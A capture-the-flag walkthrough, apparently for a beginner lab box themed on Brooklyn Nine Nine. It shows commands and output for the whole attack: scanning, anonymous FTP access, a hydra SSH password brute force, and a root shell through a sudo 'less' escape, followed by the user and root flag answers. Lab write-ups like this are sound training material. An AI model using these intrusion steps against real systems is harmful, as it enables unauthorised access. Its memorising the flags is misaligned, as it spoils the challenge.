# Task 1 Deploy and get hacking
----

>>This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

## SCANNING

```bash
root@ip-10-10-205-252:~# nmap -sC -sV 10.10.60.236

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-09 13:04 GMT
Nmap scan report for ip-10-10-60-236.eu-west-1.compute.internal (10.10.60.236)
Host is up (0.010s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.205.252
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:10:78:4C:EE:2D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

## FTP AS ANONYMOUS

>>Using ftp to connect.
>>We found a file note_to_jake.

```bash
root@ip-10-10-205-252:~# ftp 10.10.60.236
Connected to 10.10.60.236.
220 (vsFTPd 3.0.3)
Name (10.10.60.236:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (53.6771 kB/s)

root@ip-10-10-205-252:~# cat note_to_jake.txt 
From Amy,
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

## BRUTE FORCING THE PASSWORD

>>Using hydra to brute force the password.

```bash
root@ip-10-10-205-252:~# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.60.236 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-09 13:15:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.60.236:22/
[22][ssh] host: 10.10.60.236   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-09 13:15:22
```

## SSH INTO JAKE

>>Using ssh to connect to jake machine with the creds we found.  

```bash
root@ip-10-10-205-252:~# ssh jake@10.10.60.236 
jake@10.10.60.236's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:/$ find / -type f -name "*.txt" 2>/dev/null | grep "user.txt"
/home/holt/user.txt
jake@brookly_nine_nine:/$ cat /home/holt/user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```

## PRIVILEGE ESCALATION

>>'less' is the point to get the shell as root.
>>Using the payload 'sudo less /etc/profile' to get the shell as root. 

```bash
jake@brookly_nine_nine:/$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:/$ sudo less /etc/profile
# whoami
root
# cd /root       
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

----

# ANSWER THE FOLLOWING :
----

1.User flag
>>ee11cbb19052e40b07aac0ca060c23ee

2.Root flag
>>63a9f0ea7bb98050796b649e85481845

----